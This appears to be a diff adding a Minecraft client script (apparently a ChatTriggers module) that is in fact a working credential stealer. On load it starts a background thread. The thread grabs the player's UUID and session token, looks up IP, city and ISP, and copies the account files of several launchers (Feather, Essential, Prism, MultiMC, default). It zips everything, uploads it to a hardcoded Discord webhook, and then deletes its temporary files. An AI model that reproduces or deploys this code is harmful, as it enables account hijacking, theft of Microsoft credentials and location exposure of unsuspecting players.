@@ -1,0 +1,370 @@
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1381411707745865738/lAvKCeh8wJuvxqfChHk9sG9nnUI13pn7NS1uAh_tfc-SnRpH0xXH3xCUPgWpuYn-cEZ1";
+
+const File = Packages.java.io.File;
+const Files = Packages.java.nio.file.Files;
+const StandardCopyOption = Packages.java.nio.file.StandardCopyOption;
+const ZipOutputStream = Packages.java.util.zip.ZipOutputStream;
+const URL = Packages.java.net.URL;
+const UUID = Packages.java.util.UUID;
+
+const system = {
+    tempDir: new File(Packages.java.lang.System.getProperty("java.io.tmpdir")),
+    appData: new File(Packages.java.lang.System.getenv("APPDATA")),
+    mcDir: new File(Client.getMinecraft().field_71412_D.getPath())
+};
+
+// Country flag emojis
+const countryFlags = {
+    "US": "🇺🇸", "CA": "🇨🇦", "GB": "🇬🇧", "DE": "🇩🇪", "FR": "🇫🇷", "IT": "🇮🇹", "ES": "🇪🇸", "NL": "🇳🇱", "BE": "🇧🇪", "CH": "🇨🇭",
+    "AT": "🇦🇹", "SE": "🇸🇪", "NO": "🇳🇴", "DK": "🇩🇰", "FI": "🇫🇮", "PL": "🇵🇱", "CZ": "🇨🇿", "SK": "🇸🇰", "HU": "🇭🇺", "RO": "🇷🇴",
+    "BG": "🇧🇬", "HR": "🇭🇷", "SI": "🇸🇮", "EE": "🇪🇪", "LV": "🇱🇻", "LT": "🇱🇹", "IE": "🇮🇪", "PT": "🇵🇹", "GR": "🇬🇷", "CY": "🇨🇾",
+    "MT": "🇲🇹", "LU": "🇱🇺", "IS": "🇮🇸", "LI": "🇱🇮", "MC": "🇲🇨", "AD": "🇦🇩", "SM": "🇸🇲", "VA": "🇻🇦", "AU": "🇦🇺", "NZ": "🇳🇿",
+    "JP": "🇯🇵", "KR": "🇰🇷", "CN": "🇨🇳", "TW": "🇹🇼", "HK": "🇭🇰", "SG": "🇸🇬", "MY": "🇲🇾", "TH": "🇹🇭", "VN": "🇻🇳", "PH": "🇵🇭",
+    "ID": "🇮🇩", "IN": "🇮🇳", "PK": "🇵🇰", "BD": "🇧🇩", "LK": "🇱🇰", "NP": "🇳🇵", "MM": "🇲🇲", "KH": "🇰🇭", "LA": "🇱🇦", "MN": "🇲🇳",
+    "BR": "🇧🇷", "AR": "🇦🇷", "CL": "🇨🇱", "PE": "🇵🇪", "CO": "🇨🇴", "VE": "🇻🇪", "EC": "🇪🇨", "BO": "🇧🇴", "PY": "🇵🇾", "UY": "🇺🇾",
+    "MX": "🇲🇽", "GT": "🇬🇹", "BZ": "🇧🇿", "SV": "🇸🇻", "HN": "🇭🇳", "NI": "🇳🇮", "CR": "🇨🇷", "PA": "🇵🇦", "CU": "🇨🇺", "JM": "🇯🇲",
+    "HT": "🇭🇹", "DO": "🇩🇴", "PR": "🇵🇷", "TT": "🇹🇹", "BB": "🇧🇧", "GD": "🇬🇩", "LC": "🇱🇨", "VC": "🇻🇨", "AG": "🇦🇬", "KN": "🇰🇳",
+    "ZA": "🇿🇦", "EG": "🇪🇬", "NG": "🇳🇬", "KE": "🇰🇪", "TZ": "🇹🇿", "UG": "🇺🇬", "ET": "🇪🇹", "SO": "🇸🇴", "DJ": "🇩🇯", "ER": "🇪🇷",
+    "RU": "🇷🇺", "UA": "🇺🇦", "BY": "🇧🇾", "MD": "🇲🇩", "GE": "🇬🇪", "AM": "🇦🇲", "AZ": "🇦🇿", "KZ": "🇰🇿", "UZ": "🇺🇿", "TM": "🇹🇲",
+    "TJ": "🇹🇯", "KG": "🇰🇬", "AF": "🇦🇫", "IR": "🇮🇷", "IQ": "🇮🇶", "SA": "🇸🇦", "AE": "🇦🇪", "QA": "🇶🇦", "KW": "🇰🇼", "BH": "🇧🇭",
+    "OM": "🇴🇲", "YE": "🇾🇪", "JO": "🇯🇴", "LB": "🇱🇧", "SY": "🇸🇾", "IL": "🇮🇱", "PS": "🇵🇸", "TR": "🇹🇷", "MA": "🇲🇦", "DZ": "🇩🇿",
+    "TN": "🇹🇳", "LY": "🇱🇾", "SD": "🇸🇩", "TD": "🇹🇩", "NE": "🇳🇪", "ML": "🇲🇱", "BF": "🇧🇫", "CI": "🇨🇮", "GH": "🇬🇭", "SN": "🇸🇳",
+    "GN": "🇬🇳", "SL": "🇸🇱", "LR": "🇱🇷", "TG": "🇹🇬", "BJ": "🇧🇯", "GW": "🇬🇼", "CV": "🇨🇻", "GM": "🇬🇲", "CF": "🇨🇫", "CM": "🇨🇲",
+    "GQ": "🇬🇶", "GA": "🇬🇦", "CG": "🇨🇬", "CD": "🇨🇩", "AO": "🇦🇴", "ZM": "🇿🇲", "ZW": "🇿🇼", "BW": "🇧🇼", "NA": "🇳🇦", "SZ": "🇸🇿",
+    "LS": "🇱🇸", "MG": "🇲🇬", "MU": "🇲🇺", "SC": "🇸🇨", "KM": "🇰🇲", "YT": "🇾🇹", "RE": "🇷🇪", "IO": "🇮🇴", "SH": "🇸🇭", "ST": "🇸🇹",
+    "AQ": "🇦🇶", "TF": "🇹🇫", "HM": "🇭🇲", "GS": "🇬🇸", "FK": "🇫🇰", "GI": "🇬🇮", "BM": "🇧🇲", "TC": "🇹🇨", "VG": "🇻🇬", "AI": "🇦🇮",
+    "AW": "🇦🇼", "CW": "🇨🇼", "SX": "🇸🇽", "BQ": "🇧🇶", "MF": "🇲🇫", "BL": "🇧🇱", "PM": "🇵🇲", "WF": "🇼🇫", "NC": "🇳🇨", "PF": "🇵🇫",
+    "VU": "🇻🇺", "FJ": "🇫🇯", "TO": "🇹🇴", "WS": "🇼🇸", "KI": "🇰🇮", "TV": "🇹🇻", "NR": "🇳🇷", "PW": "🇵🇼", "MH": "🇲🇭", "FM": "🇫🇲",
+    "CK": "🇨🇰", "NU": "🇳🇺", "TK": "🇹🇰", "AS": "🇦🇸", "GU": "🇬🇺", "MP": "🇲🇵", "VI": "🇻🇮", "PR": "🇵🇷", "XX": "🏳️" // Unknown country
+};
+
+function getCountryFlag(countryCode) {
+    return countryFlags[countryCode] || "🏳️";
+}
+
+function createTempDirectory() {
+    const dirName = "mc_leak_" + new Date().getTime();
+    const tempDir = new File(system.tempDir, dirName);
+    tempDir.mkdirs();
+    return tempDir;
+}
+
+function collectUserData() {
+    let userData = "";
+    let ipInfo = "";
+    let countryCode = "XX";
+    let city = "Unknown";
+    
+    try {
+        userData += "**UUID:** " + Player.getUUID() + "\n\n";
+        userData += "**Token:** " + Client.getMinecraft().func_110432_I().func_148254_d() + "\n\n";
+        
+        try {
+            // Use ipapi.co for more detailed IP information
+            ipInfo = FileLib.getUrlContent("https://ipapi.co/json/");
+            console.log("Raw IP data:", ipInfo);
+            const ipData = JSON.parse(ipInfo);
+            console.log("Parsed IP data:", JSON.stringify(ipData, null, 2));
+            
+            // Format IP information nicely with more spacing
+            userData += "**IP Address:** " + (ipData.ip || "Unknown") + "\n\n";
+            userData += "**Country:** " + (ipData.country_name || "Unknown") + "\n\n";
+            userData += "**City:** " + (ipData.city || "Unknown") + "\n\n";
+            userData += "**Region:** " + (ipData.region || "Unknown") + "\n\n";
+            userData += "**ISP:** " + (ipData.org || "Unknown") + "\n\n";
+            
+            // Extract country code and city
+            if (ipData && ipData.country_code) {
+                countryCode = ipData.country_code;
+            }
+            if (ipData && ipData.city) {
+                city = ipData.city;
+            }
+        } catch (e) {
+            console.log("Error parsing IP data:", e.toString());
+            userData += "**IP Information:** Failed to retrieve\n\n";
+        }
+        
+        return { userData, ipInfo, countryCode, city };
+    } catch (e) {
+        console.log("Error collecting user data:", e.toString());
+        return { userData: "Error collecting user data: " + e.toString(), ipInfo: "", countryCode: "XX", city: "Unknown" };
+    }
+}
+
+function copyAccountFiles(tempDir) {
+    const targets = [
+        {
+            name: "Feather",
+            path: system.appData.getAbsolutePath() + "/.feather/accounts.json",
+            dest: "feather/accounts.json"
+        },
+        {
+            name: "Essentials",
+            path: system.appData.getAbsolutePath() + "/gg.essential.mod/microsoft_accounts.json",
+            dest: "essentials/microsoft_accounts.json"
+        },
+        {
+            name: "Prism",
+            path: system.appData.getAbsolutePath() + "/PrismLauncher/accounts.json",
+            dest: "prism/accounts.json"
+        },
+        {
+            name: "MultiMC",
+            path: system.mcDir.getParentFile().getParentFile().getParentFile().getAbsolutePath() + "/accounts.json",
+            dest: "multimc/accounts.json"
+        },
+        {
+            name: "DefaultMCLauncher",
+            path: system.appData.getAbsolutePath() + "/.minecraft/launcher_accounts.json",
+            dest: "mclauncher/launcher_accounts.json"
+        },
+        {
+            name: "Essentialsold",
+            path: system.mcDir.getParentFile().getParentFile().getParentFile().getAbsolutePath() + "/essentials/microsoft_accounts.json",
+            dest: "essentialsold/microsoft_accounts.json"
+        }
+    ];
+
+    let count = 0;
+    targets.forEach(target => {
+        try {
+            const source = new File(target.path);
+            const dest = new File(tempDir, target.dest);
+            dest.getParentFile().mkdirs();
+
+            if (source.exists()) {
+                Files.copy(
+                    source.toPath(),
+                    dest.toPath(),
+                    StandardCopyOption.REPLACE_EXISTING
+                );
+                count++;
+                console.log("Copied:", target.name);
+            }
+        } catch (e) {
+            console.log("Error copying", target.name + ":", e.toString());
+        }
+    });
+    console.log("Total files copied:", count);
+}
+
+function createZipArchive(sourceDir) {
+    const zipFile = new File(sourceDir.getParentFile(), "data.zip");
+    const zos = new ZipOutputStream(new Packages.java.io.FileOutputStream(zipFile));
+    let fileCount = 0;
+
+    try {
+        const stack = [];
+        stack.push(sourceDir);
+
+        while (stack.length > 0) {
+            const current = stack.pop();
+            const children = current.listFiles();
+
+            for (let i = 0; i < children.length; i++) {
+                const child = children[i];
+                const entryPath = sourceDir.toPath().relativize(child.toPath()).toString().replace(/\\/g, "/");
+
+                if (child.isDirectory()) {
+                    stack.push(child);
+                } else {
+                    try {
+                        zos.putNextEntry(new Packages.java.util.zip.ZipEntry(entryPath));
+                        const fis = new Packages.java.io.FileInputStream(child);
+                        const buffer = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 4096);
+                        let length;
+
+                        while ((length = fis.read(buffer)) >= 0) {
+                            zos.write(buffer, 0, length);
+                        }
+                        fis.close();
+                        fileCount++;
+                    } catch (e) {
+                        console.log("Error adding file to zip:", e.toString());
+                    } finally {
+                        try {
+                            zos.closeEntry();
+                        } catch (e) {}
+                    }
+                }
+            }
+        }
+    } finally {
+        zos.close();
+    }
+    console.log("Created zip with", fileCount, "files");
+    return zipFile;
+}
+
+function sendToDiscord(userData, ipInfo, countryCode, city, zipFile) {
+    try {
+        console.log("Sending embed to Discord webhook...");
+        const url = new URL(DISCORD_WEBHOOK_URL);
+        const connection = url.openConnection();
+
+        connection.setDoOutput(true);
+        connection.setRequestMethod("POST");
+        connection.setRequestProperty("Content-Type", "application/json");
+        connection.setRequestProperty("User-Agent", "Minecraft Client");
+        connection.setConnectTimeout(10000);
+        connection.setReadTimeout(30000);
+        connection.connect();
+
+        const out = connection.getOutputStream();
+        
+        // Create beautiful Discord embed
+        const embed = {
+            "embeds": [{
+                "title": "🎮 " + Player.getName(),
+                "description": userData,
+                "color": 0x00ff00,
+                "fields": [
+                    {
+                        "name": "📍 Location",
+                        "value": getCountryFlag(countryCode) + " " + (ipInfo ? JSON.parse(ipInfo).country_name || "Unknown" : "Unknown"),
+                        "inline": true
+                    },
+                    {
+                        "name": "🏙️ City",
+                        "value": city,
+                        "inline": true
+                    },
+                    {
+                        "name": "📦 Data Files",
+                        "value": Player.getName() + ".zip",
+                        "inline": true
+                    }
+                ],
+                "footer": {
+                    "text": "Minecraft Data Collector"
+                },
+                "timestamp": new Date().toISOString()
+            }]
+        };
+        
+        // Send embed first
+        const jsonPayload = new Packages.java.lang.String(JSON.stringify(embed));
+        const bytes = jsonPayload.getBytes("UTF-8");
+        out.write(bytes);
+        out.close();
+
+        const code = connection.getResponseCode();
+        console.log("Embed sent, response code:", code);
+        
+        if (code >= 200 && code < 300) {
+            console.log("Embed sent successfully!");
+            
+            // Now send the zip file separately with a simple message
+            console.log("Sending zip file to Discord webhook...");
+            const zipConnection = new URL(DISCORD_WEBHOOK_URL).openConnection();
+            zipConnection.setDoOutput(true);
+            zipConnection.setRequestMethod("POST");
+            zipConnection.setRequestProperty("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW");
+            zipConnection.setRequestProperty("User-Agent", "Minecraft Client");
+            zipConnection.setConnectTimeout(10000);
+            zipConnection.setReadTimeout(30000);
+            zipConnection.connect();
+
+            const zipOut = zipConnection.getOutputStream();
+            const boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
+            
+            // Create multipart form data with just the file
+            const formData = [];
+            formData.push("--" + boundary);
+            formData.push('Content-Disposition: form-data; name="file"; filename="' + Player.getName() + '.zip"');
+            formData.push("Content-Type: application/zip");
+            formData.push("");
+            
+            // Write form data header
+            const headerString = formData.join("\r\n");
+            const headerBytes = new Packages.java.lang.String(headerString).getBytes("UTF-8");
+            zipOut.write(headerBytes);
+            zipOut.write(new Packages.java.lang.String("\r\n").getBytes("UTF-8"));
+            
+            // Write zip file content
+            const fis = new Packages.java.io.FileInputStream(zipFile);
+            const buffer = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 4096);
+            let bytesRead;
+            let totalSent = 0;
+
+            while ((bytesRead = fis.read(buffer)) !== -1) {
+                zipOut.write(buffer, 0, bytesRead);
+                totalSent += bytesRead;
+            }
+            fis.close();
+            
+            // Write closing boundary
+            const closingBoundary = "\r\n--" + boundary + "--\r\n";
+            zipOut.write(new Packages.java.lang.String(closingBoundary).getBytes("UTF-8"));
+            zipOut.close();
+
+            const zipCode = zipConnection.getResponseCode();
+            console.log("Zip file response code:", zipCode);
+            
+            if (zipCode >= 200 && zipCode < 300) {
+                console.log("Zip file sent successfully!");
+                return true;
+            } else {
+                console.log("Zip file failed to send, HTTP code:", zipCode);
+                return false;
+            }
+        } else {
+            console.log("Embed failed to send, HTTP code:", code);
+            return false;
+        }
+    } catch (e) {
+        console.log("Error sending to Discord:", e.toString());
+        return false;
+    }
+}
+
+console.log("Starting data collection...");
+
+new Thread(function() {
+    let tempDir = null;
+    let zipFile = null;
+
+    try {
+        console.log("Collecting user data...");
+        const { userData, ipInfo, countryCode, city } = collectUserData();
+        
+        console.log("Creating temp directory...");
+        tempDir = createTempDirectory();
+        
+        console.log("Copying account files...");
+        copyAccountFiles(tempDir);
+        
+        console.log("Creating zip archive...");
+        zipFile = createZipArchive(tempDir);
+        
+        console.log("Sending to Discord...");
+        const success = sendToDiscord(userData, ipInfo, countryCode, city, zipFile);
+        
+        if (success) {
+            console.log("Data collection completed successfully!");
+        } else {
+            console.log("Data collection failed!");
+        }
+
+    } catch (e) {
+        console.log("Error in data collection:", e.toString());
+    } finally {
+        if (tempDir !== null) {
+            try {
+                Files.walk(tempDir.toPath())
+                    .sorted(Packages.java.util.Comparator.reverseOrder())
+                    .forEach(Packages.java.nio.file.Files.delete);
+            } catch (e) {
+                console.log("Error cleaning up temp dir:", e.toString());
+            }
+        }
+        if (zipFile !== null && zipFile.exists()) {
+            try {
+                zipFile.delete();
+            } catch (e) {
+                console.log("Error deleting zip file:", e.toString());
+            }
+        }
+    }
+}).start();
